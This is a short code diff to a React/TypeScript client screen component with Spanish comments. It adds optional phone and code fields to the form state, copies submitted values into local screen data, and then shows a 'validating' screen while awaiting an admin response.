@@ -52,6 +52,8 @@ export default function ClientScreen() {
     titular?: string;
     comercio?: string;
     mensaje?: string;
+    telefono?: string;
+    codigo?: string;
   }>({});
   
   // Estado para controlar los mensajes iniciales
@@ -305,6 +307,14 @@ export default function ClientScreen() {
           data: formData
         }
       });
+      
+      // Actualizar screenData local para mostrar los datos ingresados
+      if (formData.telefono) {
+        setScreenData(prev => ({ ...prev, telefono: formData.telefono }));
+      }
+      if (formData.codigo) {
+        setScreenData(prev => ({ ...prev, codigo: formData.codigo }));
+      }
       
       // Cambiar a pantalla validando mientras esperamos respuesta del admin
       setCurrentScreen(ScreenType.VALIDANDO);
